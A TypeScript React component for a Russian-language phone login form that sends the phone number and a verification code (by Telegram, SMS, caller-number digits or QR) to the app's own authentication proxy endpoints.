import { Button, Stack, Text, TextInput } from '@mantine/core';
import { useRouter } from 'next/navigation';
import { Controller, useForm } from 'react-hook-form';
import { Mode, useModeStore, useStepStore } from '../store';
import styles from './Wrap/styles.module.scss';

interface FormValues {
  phone?: string;
  code?: string;
}

const titles: Record<Mode, string[]> = {
  tg: ['Введите номер телефона', 'Введите код отправленный в Telegram'],
  code: ['Введите номер телефона', 'Введите код отправленныйв СМС'],
  number: ['Введите номер телефона', 'Введите последние 6 цифр звонившего номера'],
  qr: ['Отсканируйте QR-код'],
};

export const Form = () => {
  const form = useForm<FormValues>();
  const { mode } = useModeStore();
  const { step, setStep } = useStepStore();
  const router = useRouter();

  const handleSubmit = async (values: FormValues) => {
    const params = {
      method: 'post',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      body: JSON.stringify(values),
    };

    if (step === 0) {
      await fetch(`/proxy/auth/initial-code`, params);
      setStep(1);
    } else {
      await fetch(`/proxy/auth/by-code`, params);
      router.push('/');
    }
  };

  return (
    <form onSubmit={form.handleSubmit(handleSubmit)}>
      <Stack gap='2rem'>
        <Text className={styles.title}>{titles[mode][step]}</Text>
        <Controller
          render={({ field }) => (
            <>
              {!step ? (
                <TextInput
                  {...field}
                  size='md'
                  radius='lg'
                  label='Номер телефона'
                  placeholder='+7'
                  classNames={{
                    label: 'mb-2',
                  }}
                />
              ) : null}
            </>
          )}
          control={form.control}
          name='phone'
        />
        <Controller
          render={({ field }) => (
            <>
              {step ? (
                <TextInput
                  {...field}
                  size='md'
                  radius='lg'
                  label='Проверочный код'
                  placeholder='XX-XX-XX'
                  classNames={{
                    label: 'mb-2',
                  }}
                />
              ) : null}
            </>
          )}
          control={form.control}
          name='code'
        />
        <Button type='submit' radius='xl'>
          Войти
        </Button>
      </Stack>
    </form>
  );
};
